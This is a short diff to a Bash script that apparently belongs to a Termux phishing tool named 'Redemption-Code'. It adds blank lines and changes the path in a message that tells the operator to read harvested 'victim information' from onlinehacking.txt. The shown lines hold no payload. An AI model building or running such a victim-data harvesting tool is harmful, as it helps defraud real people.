@@ -363,8 +363,10 @@ ash1() {
 			   shark_logo
 			   echo 
 			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
+			   echo
 			   echo   
-			   echo -e "\e[95m Victim Information no show to Open Termux New Tab And Paste This Command :- \e[93m cd $HOME && cd .. && cd usr && cd bin && cd phs && cd Redemption-Code && cat onlinehacking.txt\e[95m"
+			   echo -e "\e[95m Victim Information no show to Open Termux New Tab And Paste This Command :- \e[93mcd /data/data/com.termux/files/usr/bin/phs/Redemption-Code && cat onlinehacking.txt\e[95m"
+			   echo
 			   echo
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m========================= \e[92m"
 			   echo   
